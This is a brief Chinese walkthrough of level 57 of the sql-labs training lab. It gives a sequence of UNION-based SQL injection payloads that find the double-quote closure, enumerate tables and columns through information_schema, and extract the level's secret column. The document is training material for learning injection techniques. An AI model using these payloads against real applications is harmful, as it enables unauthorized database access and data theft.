## sql-labs第五十七关

代码审计可看出，这关是双引号闭合

![](.\img\b46c30b5992229e745a726e1c208a54a.png)



~~~ cmd
?id=1
~~~

![](.\img\Less-57-01.PNG)



~~~ cmd
？id=1"
~~~

![](.\img\Less-57-02.PNG)



~~~ cmd
?id=-1" union select 1,2,3--+
~~~

![](.\img\Less-57-03.PNG)



~~~ cmd
?id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
~~~

![](.\img\Less-57-04.PNG)



~~~ cmd
?id=-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="7RKM0LN0LB"--+
~~~

![](.\img\Less-57-05.PNG)



~~~ cmd
?id=-1" union select 1,group_concat(secret_PZ2C),3 from 7RKM0LN0LB--+
~~~

![](.\img\Less-57-06.PNG)

由此成功